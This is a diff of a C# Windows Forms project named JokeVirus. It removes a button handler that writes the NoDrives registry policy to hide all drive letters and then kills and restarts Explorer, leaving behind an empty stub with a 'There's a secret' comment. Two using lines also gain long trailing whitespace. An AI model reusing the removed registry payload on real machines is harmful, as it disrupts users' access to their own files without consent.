@@ -6,9 +6,9 @@ using System.Drawing;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
-using System.Windows.Forms;
+using System.Windows.Forms;                                         
 using Timer = System.Timers.Timer;
-using System.Diagnostics;
+using System.Diagnostics;                                               
 using Microsoft.Win32;
 using System.Runtime.InteropServices;
 using System.Media;
@@ -54,18 +54,9 @@ namespace JokeVirus
 
         private void button4_Click(object sender, EventArgs e)
         {
-            RegistryKey _reg = Registry.LocalMachine;
-            _reg = _reg.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", RegistryKeyPermissionCheck.ReadWriteSubTree);
-            _reg.SetValue("NoDrives", 67108863, RegistryValueKind.DWord);
-            _reg.Close();
-            foreach (Process proc in Process.GetProcessesByName("explorer"))
-            {
-                proc.Kill();
-            }
-            Process.Start("explorer");
-
-          
-        }
+             
+          ////There's a secret   
+             }
 
         private void button6_Click(object sender, EventArgs e)
         {
